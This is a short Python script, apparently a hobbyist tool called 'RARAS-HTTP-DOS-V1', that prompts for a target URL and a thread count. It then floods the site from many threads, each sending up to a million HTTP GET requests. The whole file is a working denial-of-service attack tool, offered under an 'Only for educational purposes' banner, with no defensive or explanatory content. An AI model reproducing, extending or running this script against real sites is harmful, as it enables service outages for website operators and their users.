import requests, threading, colorama, os

colorama.init()

os.system('cls')
os.system('title [Creaminit1234] RARAS-http-dos-v1')
os.system('cls')

print(f"""
{colorama.Fore.LIGHTBLUE_EX}
RARAS-HTTP-DOS-V1
Developer: Creaminit1234
>Only for educational purposes<
""")
print(colorama.Fore.RESET)

targeturl = input("Enter URL: ")
threads = int(input("Enter Number Of Threads: "))

def requestmake():
    for i in range(1000000):
        r = requests.get(targeturl)
        print(f"{colorama.Fore.LIGHTBLUE_EX}Response: {r.status_code}")
        r.close()

def thread():
    for i in range(threads):
        tred = threading.Thread(target=requestmake)
        print(f"{colorama.Fore.LIGHTBLACK_EX}THREAD {i+1} IS READY")
        tred.start()

thread()
